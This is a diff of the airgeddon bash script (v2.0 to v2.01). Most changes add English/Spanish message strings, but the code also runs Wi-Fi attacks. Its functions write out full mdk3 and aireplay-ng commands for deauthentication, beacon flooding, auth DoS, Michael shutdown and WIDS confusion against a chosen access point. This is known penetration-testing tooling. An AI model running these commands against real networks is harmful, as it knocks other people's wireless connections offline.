@@ -1,8 +1,337 @@
 #!/bin/bash
 
-version="2.0"
+version="2.01"
 
 trap killing_script INT
+
+#change this line to select another default language
+language="english"
+#language="spanish"
+
+function language_strings() {
+
+	declare -A arr
+	arr["english",0]="This interface $interface is already in managed mode"
+	arr["spanish",0]="Este interfaz $interface ya está en modo managed"
+
+	arr["english",1]="This interface $interface is not a wifi card. It doesn't support managed mode"
+	arr["spanish",1]="Este interfaz $interface no es una tarjeta wifi. No soporta modo managed"
+
+	arr["english",2]="Kali Linux distro detected. Script can continue..."
+	arr["spanish",2]="Distro Kali Linux detectada. El script puede continuar..."
+
+	arr["english",3]="Script language changed automatically to english"
+	arr["spanish",3]="Cambio automático del idioma del script a español"
+
+	arr["english",4]="Wifislax Linux distro detected. Script can continue..."
+	arr["spanish",4]="Distro Wifislax Linux detectada. El script puede continuar..."
+
+	arr["english",5]="No compatible distro detected"
+	arr["spanish",5]="No se ha detectado una distro compatible"
+
+	arr["english",6]="Welcome to airgeddon script"
+	arr["spanish",6]="Bienvenido al airgeddon script"
+
+	arr["english",7]="This script is only for educational purposes. Be good boyz&girlz"
+	arr["spanish",7]="Este script se ha hecho sólo con fines educativos. Sed buen@s chic@s"
+
+	arr["english",8]="This script is only working on Kali Linux and Wifislax"
+	arr["spanish",8]="Este script sólo funciona en Kali Linux y Wifislax"
+
+	arr["english",9]="Detecting distro..."
+	arr["spanish",9]="Detectando distro..."
+
+	arr["english",10]="This interface $interface is already in monitor mode"
+	arr["spanish",10]="Este interfaz $interface ya está en modo monitor"
+
+	arr["english",11]="Exiting airgeddon script - 2016 - See you soon! :)"
+	arr["spanish",11]="Saliendo del airgeddon scr1pt - 2016 - Nos vemos pronto! :)"
+
+	arr["english",12]="Please, exit properly using menu option"
+	arr["spanish",12]="Por favor, sal del script correctamente utilizando la opción del menú"
+
+	arr["english",13]="This interface $interface is not a wifi card. It doesn't support monitor mode"
+	arr["spanish",13]="Este interfaz $interface no es una tarjeta wifi. No soporta modo monitor"
+
+	arr["english",14]="This interface $interface is not in monitor mode"
+	arr["spanish",14]="Este interfaz $interface no está en modo monitor"
+
+	arr["english",15]="The interface changed its name while putting in managed mode. Autoselected"
+	arr["spanish",15]="Este interfaz ha cambiado su nombre al ponerlo en modo managed. Se ha seleccionado automáticamente"
+
+	arr["english",16]="Managed mode now is set on $interface"
+	arr["spanish",16]="Se ha puesto el modo managed en $interface"
+
+	arr["english",17]="Putting your interface in managed mode..."
+	arr["spanish",17]="Poniendo el interfaz en modo managed..."
+
+	arr["english",18]="Putting your interface in monitor mode..."
+	arr["spanish",18]="Poniendo el interfaz en modo monitor..."
+
+	arr["english",19]="Please be patient. Maybe killing some conflicting processes..."
+	arr["spanish",19]="Por favor ten paciencia. Puede que esté matando algunos procesos que podrían causar conflicto..."
+
+	arr["english",20]="This interface $interface doesn't support monitor mode"
+	arr["spanish",20]="Este interfaz $interface no soporta modo monitor"
+
+	arr["english",21]="The interface changed its name while putting in monitor mode. Autoselected"
+	arr["spanish",21]="Este interfaz ha cambiado su nombre al ponerlo en modo monitor. Se ha seleccionado automáticamente"
+
+	arr["english",22]="Monitor mode now is set on $interface"
+	arr["spanish",22]="Se ha puesto el modo monitor en $interface"
+
+	arr["english",23]="There is a problem with the interface selected. Redirecting you to script exit"
+	arr["spanish",23]="Hay un problema con el interfaz seleccionado. Redirigiendo a la salida del script"
+
+	arr["english",24]="Select an interface to work with :"
+	arr["spanish",24]="Selecciona un interfaz para trabajar con él :"
+
+	arr["english",25]="Set channel (1-14) :"
+	arr["spanish",25]="Selecciona un canal (1-14) :"
+
+	arr["english",26]="Channel set to ${channel}"
+	arr["spanish",26]="Canal elegido ${channel}"
+
+	arr["english",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
+	arr["spanish",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
+
+	arr["english",28]="BSSID set to ${bssid}"
+	arr["spanish",28]="BSSID elegido ${bssid}"
+
+	arr["english",29]="Type target ESSID :"
+	arr["spanish",29]="Escribe el ESSID objetivo :"
+
+	arr["english",30]="You have selected a hidden network ESSID. Can't be used. Select another one or perform a BSSID based attack instead of this"
+	arr["spanish",30]="Has seleccionado un ESSID de red oculta. No se puede usar. Selecciona otro o ejecuta un ataque basado en BSSID en lugar de este"
+
+	arr["english",31]="ESSID set to ${essid}"
+	arr["spanish",31]="ESSID elegido ${essid}"
+
+	arr["english",32]="All parameters set"
+	arr["spanish",32]="Todos los parámetros están listos"
+
+	arr["english",33]="Starting attack. When started, press Ctrl+C to stop..."
+	arr["spanish",33]="Comenzando ataque. Una vez empezado, pulse Ctrl+C para pararlo..."
+
+	arr["english",34]="Selected interface $interface is in monitor mode. Attack can be performed"
+	arr["spanish",34]="El interfaz seleccionado $interfaz está en modo monitor. El ataque se puede realizar"
+
+	arr["english",35]="Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
+	arr["spanish",35]="Elegido ataque de Desautenticación / Desasociación mdk3 (modo monitor requerido)"
+
+	arr["english",36]="Deauthentication aireplay attack chosen (monitor mode needed)"
+	arr["spanish",36]="Elegido ataque de Desautenticación aireplay (modo monitor requerido)"
+
+	arr["english",37]="WIDS / WIPS / WDS Confusion attack chosen (monitor mode needed)"
+	arr["spanish",37]="Elegido ataque Confusion WIDS / WIPS / WDS (modo monitor requerido)"
+
+	arr["english",38]="Beacon flood attack chosen (monitor mode needed)"
+	arr["spanish",38]="Elegido ataque Beacon flood (modo monitor requerido)"
+
+	arr["english",39]="Auth DoS attack chosen (monitor mode needed)"
+	arr["spanish",39]="Elegido ataque Auth DoS (modo monitor requerido)"
+
+	arr["english",40]="Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
+	arr["spanish",40]="Elegido ataque Michael Shutdown (TKIP) (modo monitor requerido)"
+
+	arr["english",41]="No interface selected. You'll be redirected to select one"
+	arr["spanish",41]="No hay interfaz seleccionado. Serás redirigido para seleccionar uno"
+
+	arr["english",42]="Interface $interface selected. Mode: $ifacemode"
+	arr["spanish",42]="Interfaz $interface seleccionado. Modo: $ifacemode"
+
+	arr["english",43]="Selected BSSID: $bssid"
+	arr["spanish",43]="BSSID seleccionado: $bssid"
+
+	arr["english",44]="Selected channel: $channel"
+	arr["spanish",44]="Canal seleccionado: $channel"
+
+	arr["english",45]="Selected ESSID: $essid <- can't be used"
+	arr["spanish",45]="ESSID seleccionado: $essid <- no se puede usar"
+
+	arr["english",46]="Selected ESSID: $essid"
+	arr["spanish",46]="ESSID seleccionado: $essid"
+
+	arr["english",47]="Select an option from menu :"
+	arr["spanish",47]="Selecciona una opción del menú :"
+
+	arr["english",48]="1.  Select another network interface"
+	arr["spanish",48]="1.  Selecciona otro interfaz de red"
+
+	arr["english",49]="2.  Explore neighbourhood for targets (monitor mode needed)"
+	arr["spanish",49]="2.  Explorar el vecindario para buscar objetivos (modo monitor requerido)"
+
+	arr["english",50]="---------(monitor mode needed for attacks)---------"
+	arr["spanish",50]="--------(modo monitor requerido en ataques)--------"
+
+	arr["english",51]="3.  Deauth / disassoc amok mdk3 attack"
+	arr["spanish",51]="3.  Ataque Deauth / Disassoc amok mdk3"
+
+	arr["english",52]="4.  Deauth aireplay attack"
+	arr["spanish",52]="4.  Ataque Deauth aireplay"
+
+	arr["english",53]="5.  WIDS / WIPS / WDS Confusion attack"
+	arr["spanish",53]="5.  Ataque WIDS / WIPS / WDS Confusion"
+
+	arr["english",54]="6.  Old \"obsolete/non very effective\" attacks menu"
+	arr["spanish",54]="6.  Menú de antiguos ataques \"obsoletos/no muy efectivos\""
+
+	arr["english",55]="7.  Put interface in monitor mode"
+	arr["spanish",55]="7.  Poner el interfaz en modo monitor"
+
+	arr["english",56]="8.  Put interface in managed mode"
+	arr["spanish",56]="8.  Poner el interfaz en modo managed"
+
+	arr["english",57]="6.  Put interface in monitor mode"
+	arr["spanish",57]="6.  Poner el interfaz en modo monitor"
+
+	arr["english",58]="7.  Put interface in managed mode"
+	arr["spanish",58]="7.  Poner el interfaz en modo managed"
+
+	arr["english",59]="8.  Return to main menu"
+	arr["spanish",59]="8.  Volver al menú principal"
+
+	arr["english",60]="9.  About & Credits"
+	arr["spanish",60]="9.  Acerca de & Créditos"
+
+	arr["english",61]="11. Exit script"
+	arr["spanish",61]="11. Salir del script"
+
+	arr["english",62]="3.  Beacon flood attack"
+	arr["spanish",62]="3.  Ataque Beacon flood"
+
+	arr["english",63]="4.  Auth DoS attack"
+	arr["spanish",63]="4.  Ataque Auth DoS"
+
+	arr["english",64]="5.  Michael shutdown exploitation (TKIP) attack"
+	arr["spanish",64]="5.  Ataque Michael shutdown exploitation (TKIP)"
+
+	arr["english",65]="Exploring neighbourhood option chosen (monitor mode needed)"
+	arr["spanish",65]="Elegida opción de exploración del vecindario (modo monitor requerido)"
+
+	arr["english",66]="Selected interface $interface is in monitor mode. Exploration can be performed"
+	arr["spanish",66]="El interfaz seleccionado $interfaz está en modo monitor. La exploración se puede realizar"
+
+	arr["english",67]="When started, press Ctrl+C to stop..."
+	arr["spanish",67]="Una vez empezado, pulse Ctrl+C para pararlo..."
+
+	arr["english",68]="No networks found"
+	arr["spanish",68]="No se encontraron redes"
+
+	arr["english",69]="  N.         BSSID      CHANNEL  PWR       ESSID"
+	arr["spanish",69]="  N.         BSSID       CANAL   PWR       ESSID"
+
+	arr["english",70]="Only one target detected. Autoselected"
+	arr["spanish",70]="Sólo un objetivo detectado. Se ha seleccionado automáticamente"
+
+	arr["english",71]="(*) Network with clients"
+	arr["spanish",71]="(*) Red con clientes"
+
+	arr["english",72]="Invalid target network was chosen"
+	arr["spanish",72]="Red objetivo elegida no válida"
+
+	arr["english",73]="airgeddon script v$version developed by :"
+	arr["spanish",73]="airgeddon script v$version programado por :"
+
+	arr["english",74]="This script is under GPLv2 (or later) License"
+	arr["spanish",74]="Este script está bajo Licencia GPLv2 (o posterior)"
+
+	arr["english",75]="Thanks to the \"Spanish pen testing crew\" for beta testing and support received"
+	arr["spanish",75]="Gracias al \"Spanish pen testing crew\" por el beta testing y el apoyo recibido"
+
+	arr["english",76]="Invalid menu option was chosen"
+	arr["spanish",76]="Opción del menú no válida"
+
+	arr["english",77]="Invalid interface was chosen"
+	arr["spanish",77]="Interfaz no válida"
+
+	arr["english",78]="10. Change language"
+	arr["spanish",78]="10. Cambiar idioma"
+
+	arr["english",79]="1.  English"
+	arr["spanish",79]="1.  Inglés"
+
+	arr["english",80]="2.  Spanish"
+	arr["spanish",80]="2.  Español"
+
+	arr["english",81]="Select a language :"
+	arr["spanish",81]="Selecciona un idioma :"
+
+	arr["english",82]="Invalid language was chosen"
+	arr["spanish",82]="Idioma no válido"
+
+	arr["english",83]="Language changed to English"
+	arr["spanish",83]="Idioma cambiado a Inglés"
+
+	arr["english",84]="Language changed to Spanish"
+	arr["spanish",84]="Idioma cambiado a Español"
+
+	arr["english",85]="Send me bugs or suggestions to v1s1t0r.1sh3r3@gmail.com"
+	arr["spanish",85]="Enviadme errores o sugerencias a v1s1t0r.1sh3r3@gmail.com"
+
+	case "$3" in
+		"yellow")
+			echo_yellow "${arr[$1,$2]}"
+		;;
+		"blue")
+			echo_blue "${arr[$1,$2]}"
+		;;
+		"red")
+			echo_red "${arr[$1,$2]}"
+		;;
+		"green")
+			echo_green "${arr[$1,$2]}"
+		;;
+		*)
+			echo "${arr[$1,$2]}"
+		;;
+	esac
+}
+
+function do_read() {
+
+	case "$language" in
+		"spanish")
+			read -p "Pulse la tecla [Enter] para continuar..."
+		;;
+		"english")
+			read -p "Press [Enter] key to continue..."
+		;;
+		*)
+			read -p "Press [Enter] key to continue..."
+		;;
+	esac
+}
+
+function do_select_target_read() {
+
+	case "$language" in
+		"spanish")
+			read -p "Selecciona la red objetivo : " select
+		;;
+		"english")
+			read -p "Select target network : " select
+		;;
+		*)
+			read -p "Select target network : " select
+		;;
+	esac
+}
+
+function do_attack_read() {
+
+	case "$language" in
+		"spanish")
+			read -p "Pulse la tecla [Enter] para comenzar el ataque..."
+		;;
+		"english")
+			read -p "Press [Enter] key to start attack..."
+		;;
+		*)
+			read -p "Press [Enter] key to start attack..."
+		;;
+	esac
+}
 
 function check_to_set_managed() {
 
@@ -10,14 +339,14 @@ function check_to_set_managed() {
 	case "$ifacemode" in
 		"Managed")
 			echo
-			echo_yellow "This interface $interface is already in managed mode"
-			read -p "Press [Enter] key to continue..."
+			language_strings $language 0 "yellow"
+			do_read
 			return 1
 		;;
 		"(Non wifi card)")
 			echo
-			echo_yellow "This interface $interface is not a wifi card. It doesn't support managed mode"
-			read -p "Press [Enter] key to continue..."
+			language_strings $language 1 "yellow"
+			do_read
 			return 1
 		;;
 	esac
@@ -31,14 +360,14 @@ function check_to_set_monitor() {
 	case "$ifacemode" in
 		"Monitor")
 			echo
-			echo_yellow "This interface $interface is already in monitor mode"
-			read -p "Press [Enter] key to continue..."
+			language_strings $language 10 "yellow"
+			do_read
 			return 1
 		;;
 		"(Non wifi card)")
 			echo
-			echo_yellow "This interface $interface is not a wifi card. It doesn't support monitor mode"
-			read -p "Press [Enter] key to continue..."
+			language_strings $language 13 "yellow"
+			do_read
 			return 1
 		;;
 	esac
@@ -51,8 +380,8 @@ function check_monitor_enabled() {
 
 	if [[ $mode != "Monitor" ]]; then
 		echo
-		echo_yellow "This interface $interface is not in monitor mode"
-		read -p "Press [Enter] key to continue..."
+		language_strings $language 14 "yellow"
+		do_read
 		return 1
 	fi
 	return 0
@@ -76,7 +405,7 @@ function managed_option() {
 
 	disable_rfkill
 
-	echo_blue "Putting your interface in managed mode..."
+	language_strings $language 17 "blue"
 	ifconfig $interface up
 
 	if [ "$distro" = "Kali" ]; then
@@ -88,13 +417,13 @@ function managed_option() {
 
 	if [ "$interface" != "$new_interface" ]; then
 		echo
-		echo_yellow "The interface changed its name while putting in managed mode. Autoselected"
+		language_strings $language 15 "yellow"
 		interface=$new_interface
 	fi
 
 	echo
-	echo_yellow "Managed mode now is set on $interface"
-	read -p "Press [Enter] key to continue..."
+	language_strings $language 16 "yellow"
+	do_read
 }
 
 function monitor_option() {
@@ -106,15 +435,15 @@ function monitor_option() {
 
 	disable_rfkill
 
-	echo_blue "Putting your interface in monitor mode..."
-	echo_blue "Please be patient. Maybe killing some conflicting processes..."
+	language_strings $language 18 "blue"
+	language_strings $language 19 "blue"
 	ifconfig $interface up
 	iwconfig $interface rate 1M > /dev/null 2>&1
 
 	if [ "$?" != "0" ]; then
 		echo
-		echo_yellow "This interface $interface doesn't support monitor mode"
-		read -p "Press [Enter] key to continue..."
+		language_strings $language 20 "yellow"
+		do_read
 		return
 	fi
 
@@ -130,13 +459,13 @@ function monitor_option() {
 
 	if [ "$interface" != "$new_interface" ]; then
 		echo
-		echo_yellow "The interface changed its name while putting in monitor mode. Autoselected"
+		language_strings $language 21 "yellow"
 		interface=$new_interface
 	fi
 
 	echo
-	echo_yellow "Monitor mode now is set on $interface"
-	read -p "Press [Enter] key to continue..."
+	language_strings $language 22 "yellow"
+	do_read
 }
 
 function check_interface_mode() {
@@ -169,23 +498,50 @@ function check_interface_mode() {
 	      return 0
 	fi
 
-	echo_yellow "There is a problem with the interface selected. Redirecting you to exit script"
-	read -p "Press [Enter] key to continue..."
+	language_strings $language 23 "yellow"
+	do_read
 	exit_script_option
+}
+
+function language_option() {
+
+	clear
+	echo_red "*******************************Change language**********************************"
+	language_strings $language 81 "green"
+	echo
+	language_strings $language 79
+	language_strings $language 80
+
+	read language_selected
+	case $language_selected in
+		1)
+			language="english"
+			language_strings $language 83 "yellow"
+			do_read
+		;;
+		2)
+			language="spanish"
+			language_strings $language 84 "yellow"
+			do_read
+		;;
+		*)
+			invalid_language_selected
+		;;
+	esac
 }
 
 function select_interface() {
 
 	clear
 	echo_red "*****************************Interface selection********************************"
-	echo_green "Select an interface to work with :"
-        echo
+	language_strings $language 24 "green"
+	echo
 	ifaces=`ifconfig -a|grep HWaddr|cut -d ' ' -f 1`
 	option_counter=0
 	for item in $ifaces
 	do
 		option_counter=$[option_counter + 1]
-	        echo "$option_counter. $item"
+		echo "$option_counter. $item"
 	done
 	read iface
 	if [ -z $iface ]; then
@@ -209,7 +565,7 @@ function select_interface() {
 function read_channel() {
 
 	echo
-	echo_green "Set channel (1-14) :"
+	language_strings $language 25 "green"
 	read channel
 }
 
@@ -219,13 +575,13 @@ function ask_channel() {
 		read_channel
 	done
 	echo
-	echo_yellow "Channel set to ${channel}"
+	language_strings $language 26 "yellow"
 }
 
 function read_bssid() {
 
 	echo
-	echo_green "Type target BSSID (example: 00:11:22:33:44:55) :"
+	language_strings $language 27 "green"
 	read bssid
 }
 
@@ -235,13 +591,13 @@ function ask_bssid() {
 		read_bssid
 	done
 	echo
-	echo_yellow "BSSID set to ${bssid}"
+	language_strings $language 28 "yellow"
 }
 
 function read_essid() {
 
 	echo
-	echo_green "Type target ESSID :"
+	language_strings $language 29 "green"
 	read essid
 }
 
@@ -251,27 +607,27 @@ function ask_essid() {
 		read_essid
 		else if [ "$essid" = "(Hidden Network)" ]; then
 			echo
-			echo_yellow "You have selected a hidden network ESSID. Can't use it. Select another one or perform a BSSID based attack instead of this"
+			language_strings $language 30 "yellow"
 			read_essid
 		fi
 	fi
 
 	echo
-	echo_yellow "ESSID set to ${essid}"
+	language_strings $language 31 "yellow"
 }
 
 function exec_mdk3deauth() {
 
 	echo
 	echo_red "******************************Mdk3 amok action**********************************"
-	echo_green "All parameters set"
+	language_strings $language 32 "green"
 
-	rm /tmp/bl.txt > /dev/null 2>&1
+	rm -rf /tmp/bl.txt > /dev/null 2>&1
 	echo $bssid > /tmp/bl.txt
 
 	echo
-	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
-	read -p "Press [Enter] key to start attack..."
+	language_strings $language 33 "blue"
+	do_attack_read
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 amok attack" -e mdk3 $interface d -b /tmp/bl.txt -c $channel
 }
 
@@ -279,13 +635,13 @@ function exec_aireplaydeauth() {
 
 	echo
 	echo_red "***************************Aireplay deauth action*******************************"
-	echo_green "All parameters set"
+	language_strings $language 32 "green"
 
 	airmon-ng start $interface $channel > /dev/null 2>&1
 
 	echo
-	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
-	read -p "Press [Enter] key to start attack..."
+	language_strings $language 33 "blue"
+	do_attack_read
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $interface
 }
 
@@ -293,11 +649,11 @@ function exec_wdsconfusion() {
 
 	echo
 	echo_red "*********************WIDS / WIPS / WDS confusion action*************************"
-	echo_green "All parameters set"
+	language_strings $language 32 "green"
 
 	echo
-	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
-	read -p "Press [Enter] key to start attack..."
+	language_strings $language 33 "blue"
+	do_attack_read
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "wids / wips / wds confusion attack" -e mdk3 $interface w -e $essid -c $channel
 }
 
@@ -305,11 +661,11 @@ function exec_beaconflood() {
 
 	echo
 	echo_red "****************************Beacon flood action*********************************"
-	echo_green "All parameters set"
+	language_strings $language 32 "green"
 
 	echo
-	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
-	read -p "Press [Enter] key to start attack..."
+	language_strings $language 33 "blue"
+	do_attack_read
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "beacon flood attack" -e mdk3 $interface b -n $essid -c $channel -s 1000 -h
 }
 
@@ -317,11 +673,11 @@ function exec_authdos() {
 
 	echo
 	echo_red "******************************Auth DoS action***********************************"
-	echo_green "All parameters set"
+	language_strings $language 32 "green"
 
 	echo
-	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
-	read -p "Press [Enter] key to start attack..."
+	language_strings $language 33 "blue"
+	do_attack_read
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "auth dos attack" -e mdk3 $interface a -a $bssid -m -s 1024
 }
 
@@ -329,11 +685,11 @@ function exec_michaelshutdown() {
 
 	echo
 	echo_red "**************************Michael Shutdown action*******************************"
-	echo_green "All parameters set"
+	language_strings $language 32 "green"
 
 	echo
-	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
-	read -p "Press [Enter] key to start attack..."
+	language_strings $language 33 "blue"
+	do_attack_read
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "michael shutdown attack" -e mdk3 $interface m -t $bssid -w 1 -n 1024 -s 1024
 }
 
@@ -341,7 +697,7 @@ function mdk3_deauth_option() {
 
 	echo
 	echo_red "****************************Mdk3 amok parameters********************************"
-	echo_green "Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
+	language_strings $language 35 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -349,7 +705,7 @@ function mdk3_deauth_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+	language_strings $language 34 "yellow"
 
 	ask_bssid
 	ask_channel
@@ -360,7 +716,7 @@ function aireplay_deauth_option() {
 
 	echo
 	echo_red "*************************Aireplay deauth parameters*****************************"
-	echo_green "Deauthentication aireplay attack chosen (monitor mode needed)"
+	language_strings $language 36 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -368,7 +724,7 @@ function aireplay_deauth_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+	language_strings $language 34 "yellow"
 
 	ask_bssid
 	ask_channel
@@ -379,7 +735,7 @@ function wds_confusion_option() {
 
 	echo
 	echo_red "************************WIDS / WIPS / WDS parameters****************************"
-	echo_green "WIDS / WIPS / WDS confusion attack chosen (monitor mode needed)"
+	language_strings $language 37 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -387,7 +743,7 @@ function wds_confusion_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+	language_strings $language 34 "yellow"
 
 	ask_essid
 	ask_channel
@@ -398,7 +754,7 @@ function beacon_flood_option() {
 
 	echo
 	echo_red "***************************Beacon flood parameters******************************"
-	echo_green "Beacon flood attack chosen (monitor mode needed)"
+	language_strings $language 38 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -406,7 +762,7 @@ function beacon_flood_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+	language_strings $language 34 "yellow"
 
 	ask_essid
 	ask_channel
@@ -417,7 +773,7 @@ function auth_dos_option() {
 
 	echo
 	echo_red "*****************************Auth DoS parameters********************************"
-	echo_green "Auth DoS attack chosen (monitor mode needed)"
+	language_strings $language 39 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -425,7 +781,7 @@ function auth_dos_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+	language_strings $language 34 "yellow"
 
 	ask_bssid
 	exec_authdos
@@ -435,7 +791,7 @@ function michael_shutdown_option() {
 
 	echo
 	echo_red "************************Michael Shutdown parameters*****************************"
-	echo_green "Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
+	language_strings $language 40 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -443,7 +799,7 @@ function michael_shutdown_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+	language_strings $language 34 "yellow"
 
 	ask_bssid
 	exec_michaelshutdown
@@ -452,26 +808,26 @@ function michael_shutdown_option() {
 function print_selections() {
 
 	if [ -z "$interface" ]; then
-		echo_blue "No interface selected. You'll be redirected to select one"
+		language_strings $language 41 "blue"
 		echo
-		read -p "Press [Enter] key to continue..."
+		do_read
 		select_interface
 		menu_options
 	else
 		check_interface_mode
-		echo_blue "Interface $interface selected. Mode: $ifacemode"
+		language_strings $language 42 "blue"
 	fi
 
 	if [ -n "$bssid" ]; then
-		echo_blue "Selected BSSID: $bssid"
+		language_strings $language 43 "blue"
 		if [ -n "$channel" ]; then
-			echo_blue "Selected Channel: $channel"
+			language_strings $language 44 "blue"
 		fi
 		if [ -n "$essid" ]; then
 			if [ "$essid" = "(Hidden Network)" ]; then
-				echo_blue "Selected ESSID: $essid <- can't be used"
+				language_strings $language 45 "blue"
 			else
-				echo_blue "Selected ESSID: $essid"
+				language_strings $language 46 "blue"
 			fi
 		fi
 
@@ -485,22 +841,23 @@ function menu_options() {
 	current_menu="main"
 	print_selections
 	echo
-	echo_green "Select your option from menu :"
-    echo_blue "---------"
-	echo "1. Select another network interface"
-	echo "2. Explore neighbourhood (info window) for targets (monitor mode needed)"
-	echo_blue "---------(monitor mode needed for attacks)---------"
-    echo "3. Deauth / disassoc amok mdk3 attack"
-    echo "4. Deauth aireplay attack"
-	echo "5. WIDS / WIPS / WDS confusion attack"
+	language_strings $language 47 "green"
 	echo_blue "---------"
-	echo "6. Old \"obsolete/non very effective\" attacks menu"
+	language_strings $language 48
+	language_strings $language 49
+	language_strings $language 50 "blue"
+	language_strings $language 51
+	language_strings $language 52
+	language_strings $language 53
 	echo_blue "---------"
-	echo "7. Put interface in monitor mode"
-	echo "8. Put interface in managed mode"
+	language_strings $language 54
 	echo_blue "---------"
-	echo "9. Credits & about"
-    echo "10. Exit script"
+	language_strings $language 55
+	language_strings $language 56
+	echo_blue "---------"
+	language_strings $language 60
+	language_strings $language 78
+	language_strings $language 61
 	read option
 
 	case $option in
@@ -532,6 +889,9 @@ function menu_options() {
 			credits_option
 		;;
 		10)
+			language_option
+		;;
+		11)
 			exit_script_option
 		;;
 		*)
@@ -549,21 +909,22 @@ function old_attacks_menu() {
 	current_menu="old"
 	print_selections
 	echo
-	echo_green "Select your option from menu :"
+	language_strings $language 47 "green"
 	echo_blue "---------"
-	echo "1. Select another network interface"
-	echo "2. Explore neighbourhood (info window) for targets (monitor mode needed)"
-    echo_blue "---------(monitor mode needed for attacks)---------"
-	echo "3. Beacon flood attack"
-	echo "4. Auth DoS attack"
-	echo "5. Michael shutdown exploitation (TKIP) attack"
+	language_strings $language 48
+	language_strings $language 49
+	language_strings $language 50 "blue"
+	language_strings $language 62
+	language_strings $language 63
+	language_strings $language 64
 	echo_blue "---------"
-	echo "6. Put interface in monitor mode"
-	echo "7. Put interface in managed mode"
+	language_strings $language 57
+	language_strings $language 58
 	echo_blue "---------"
-	echo "8. Return to main menu"
-	echo "9. Credits & about"
-        echo "10. Exit script"
+	language_strings $language 59
+	language_strings $language 60
+	language_strings $language 78
+	language_strings $language 61
 
 	read oldoption
 
@@ -596,6 +957,9 @@ function old_attacks_menu() {
 			credits_option
 		;;
 		10)
+			language_option
+		;;
+		11)
 			exit_script_option
 		;;
 		*)
@@ -609,7 +973,7 @@ function explore_neighbourhood_option() {
 
 	echo
 	echo_red "***************************Exploring Neighbourhood******************************"
-	echo_green "Exploring Neighbourhood option chosen (monitor mode needed)"
+	language_strings $language 65 "green"
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
@@ -617,13 +981,13 @@ function explore_neighbourhood_option() {
 	fi
 
 	echo
-	echo_yellow "Selected interface $interface is in monitor mode. Exploration can be performed"
+	language_strings $language 66 "yellow"
 	echo
-	echo_blue "When started, press Ctrl+C to stop..."
+	language_strings $language 67 "yellow"
+	do_read
 
-	read -p "Press [Enter] key to continue..."
-	rm /tmp/nws* > /dev/null 2>&1
-	rm /tmp/clts.csv > /dev/null 2>&1
+	rm -rf /tmp/nws* > /dev/null 2>&1
+	rm -rf /tmp/clts.csv > /dev/null 2>&1
 	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "Exploring neighbourhood" -e airodump-ng -w /tmp/nws $interface
 	targetline=`cat /tmp/nws-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 	targetline=`expr $targetline - 1`
@@ -634,13 +998,13 @@ function explore_neighbourhood_option() {
 	csvline=`wc -l /tmp/nws.csv | awk '{print $1}'`
 	if [ $csvline -le 3 ]; then
 		echo
-		echo_yellow "No networks found"
-		read -p "Press [Enter] key to continue..."
+		language_strings $language 68 "yellow"
+		do_read
 		return
 	fi
 
-	rm  /tmp/nws.txt > /dev/null 2>&1
-	rm  /tmp/wnws.txt > /dev/null 2>&1
+	rm -rf /tmp/nws.txt > /dev/null 2>&1
+	rm -rf /tmp/wnws.txt > /dev/null 2>&1
 	i=0
 	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
 
@@ -677,7 +1041,7 @@ function select_target() {
 
 	clear
 	echo_red "*******************************Select target************************************"
-	echo "  N.         BSSID      CHANNEL  PWR       ESSID"
+	language_strings $language 69
 	echo_blue "-------------------------------------------------------"
 	i=0
 	while IFS=, read MAC CHANNEL POWER ESSID; do
@@ -724,21 +1088,21 @@ function select_target() {
 	done < "/tmp/wnws.txt"
 	echo
 	if [ $i -eq 1 ]; then
-		echo_yellow "Only one target detected. Autoselected"
+		language_strings $language 70 "yellow"
 		select=1
-		read -p "Press [Enter] key to continue..."
+		do_read
 	else
-		echo "(*) Network with clients"
+		language_strings $language 71
 		echo_blue "-------------------------------------------------------"
 		echo
-		read -p "Select target network : " select
+		do_select_target_read
 	fi
 
 	while [[ $select -lt 1 ]] || [[ $select -gt $i ]]; do
 		echo
-		echo_yellow "Invalid target network was chosen"
+		language_strings $language 72 "yellow"
 		echo
-		read -p "Select target network : " select
+		do_select_target_read
 	done
 
 	essid=${network_names[$select]}
@@ -749,8 +1113,8 @@ function select_target() {
 function credits_option() {
 
 	clear
-	echo_red "******************************Credits & about***********************************"
-	echo_blue "airgeddon script v$version developed by :"
+	echo_red "******************************About & Credits***********************************"
